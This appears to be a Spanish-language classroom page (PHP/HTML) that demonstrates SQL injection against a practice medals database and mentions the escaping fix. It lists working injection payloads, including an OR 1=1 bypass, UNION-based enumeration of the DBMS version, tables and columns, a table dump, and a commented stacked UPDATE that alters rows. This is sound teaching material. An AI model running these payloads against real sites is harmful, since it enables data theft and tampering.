<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>

<head>
    <title>Ataque SQL Injection</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="atacar.js"></script>
    <link rel="stylesheet" href="atacar.css">
    <!--
    <link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css">
<script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
    -->
</head>

<body>
    <?php
    ini_set('display_errors', 'On');
    error_reporting(E_ALL);
    require_once 'funciones_atacar.php';
    ?>
    <h1>Ataque SQL Injection</h1>
    <p>Examinando un sitio con la ayuda de las herramientas para desarrolladores del navegador (pestaña de red) hemos
        localizado el archivo <code>medallas_modalidades.php</code> que lista las medallas de determinada modalidad
        deportiva.</p>
    <p>Para poder hacer ese listado se realiza una consulta a la BBDD con determinado usuario y contraseña.</p>
    <p>Si el código no está convenientemente protegido, se puede modificar el parámetro para que ejecute comandos sql
        maliciosos.</p>
    <p>Lo mejor de todo es que necesitamos una única línea de código para protegernos: antes de meter la variable
        <code>$mod</code> en la query, hacemos:</p>
    <p><code>$mod=mysqli_escape_string($conexion,$mod);</code></p>
    <p>Si quieres hacer pruebas puedes usar el <a href="formulario_pruebas.html">formulario</a> que manda un dato al
        fichero.</p>
    <p>En una situación normal de hosting, el usuario con el que php se conecta al SGBD tiene permisos de administrador
        en su propia base de datos. Manipulando la query podemos hacer bastante pupa.</p>
    <p>Comprobemos primero el funcionamiento normal</p>
    <p>Se ha modificado la función para que escriba la query</p>
    <?php ejemplo('Funcionamiento normal', "ar2") ?>
    <p>Para comprobar si es posible el ataque intentamos deshabilitar el filtro combinándolo con un <code>1=1</code>,
        que es siempre cierto. Para que no nos quede una comilla simple al final de la expresión, terminamos con dos
        guiones medios, que son el comentario SQL. Se lista toda la tabla de medallas</p>
    <?php ejemplo('Comprobar si SQL Injection es posible', "ar2' OR 1=1 -- ") ?>
    <p>Como tenemos un listado de tres campos, podemos hacer un union con otro listado de tres campos.</p>
    <p>Ahora que sabemos que el ataque es posible nos interesa saber qué SGBD está actuando</p>
    <p>A partir de aquí el ejercicio se centra en MySQL/MariaDB pero se puede adaptar a otros</p>
    <?php ejemplo('Comprobar si es MySQL o MariaDB y qué versión', "ar2' UNION SELECT @@VERSION ,1,1 -- ") ?>
    <p>También podríamos meter un código no válido para que sólo salga lo que nos interesa</p>
    <?php ejemplo('Comprobar si es MySQL o MariaDB y qué versión', "ar200' UNION SELECT @@VERSION ,1,1 -- ") ?>
    <p>Sabiendo el SGBD que queremos atacar, miraríamos en foros para ver si hay algún fallo de seguridad adicional que
        podamos aprovechar</p>
    <?php ejemplo('Descubrir BBDD activa', "ar2' UNION SELECT DATABASE(),1,1 FROM DUAL -- ") ?>
    <p>Ahora que sabemos el nombre de la BBDD podemos obtener las tablas</p>
    <?php ejemplo('Obtener las tablas de la BBDD atacar', "ar2' UNION SELECT table_name,1,1 FROM information_schema.tables WHERE table_schema='atacar'
 -- ") ?>
    <p>Obtenemos un error porque las tablas tienen distintos <em>collate</em>. Nuestra BBDD tiene
        <code>utf8_spanish_ci</code> y la del sistema <code>utf8_general_ci</code></p>
    <p>Realizamos la conversión</p>
    <?php ejemplo('Obtener las tablas de la BBDD atacar', "ar2' UNION SELECT table_name COLLATE utf8_spanish_ci,1,1 FROM information_schema.tables WHERE table_schema='atacar'
 -- ") ?>
    <p>Ahora que sabemos el nombre de la BBDD y las tablas, conseguimos los campos de una de ellas</p>
    <?php ejemplo('Descubrir nombres de campo de la tabla deportes en la BBDD atacar', "ar2' UNION SELECT `COLUMN_NAME` COLLATE utf8_spanish_ci ,1,1 FROM `INFORMATION_SCHEMA`.`COLUMNS` WHERE `TABLE_SCHEMA`='atacar' AND `TABLE_NAME`='deportes' -- ") ?>
    <p>Con esta información podemos listar la tabla completa. Si tuviera más de tres campos haríamos varios listados</p>
    <p>Piensa si esto fuera la lista de usuarios suscritos a determinado sitio con un teléfono válido, un correo
        electrónico y un número de visa. Si incluye contraseñas y el sitio no las encripta en la BBDD la mayoría
        servirán para los correos asociados</p>
    <?php ejemplo('Listar la tabla deportes en la BBDD atacar', "ar2' UNION SELECT `codigo`, `nombre`, `nombre` FROM `deportes`  -- ") ?>
    <p>Está claro que aunque no viéramos la query estas técnicas nos permitirían conocer las tablas y sus campos.</p>
    <p>Que nos robasen la información contenida en las tablas sería un problema pero no el único</p>
    <p>Nos podrían hackear el sitio modificando nuestras tablas</p>
    <!--
SELECT `metal`,`ganador`,`paises`.nombre as `nom_pais` FROM `medallas` LEFT JOIN `paises` ON `medallas`.`pais` = `paises`.`codigo` WHERE `modalidad` = 'ow0' ; UPDATE `medallas` SET `ganador` = 'Robin' WHERE `metal` = 'oro' AND `modalidad` = 'ow1' ; -- '   
    -->
</body>

</html>